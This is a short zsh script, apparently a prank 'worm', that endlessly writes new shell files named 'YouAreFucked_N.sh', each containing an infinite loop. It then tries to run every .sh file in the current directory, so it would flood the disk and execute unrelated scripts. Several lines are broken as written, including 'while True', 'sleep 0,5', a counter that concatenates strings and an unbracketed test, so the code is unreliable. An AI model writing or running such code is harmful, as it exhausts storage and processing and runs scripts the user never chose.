#!/bin/zsh


context="""
while True
do
  echo 'You are DONE'
done
"""

Num=1

while True
do
  echo "$context" > YouAreFucked_$Num.sh
  Num=$Num+1
  sleep 0,5

  if $Num -eq 50000
  then
    do
      for wormed in $(pwd)/*.sh
      do
        if  $wormed != worm
        then
          bash $wormed
        fi
      done
    done
  fi
done
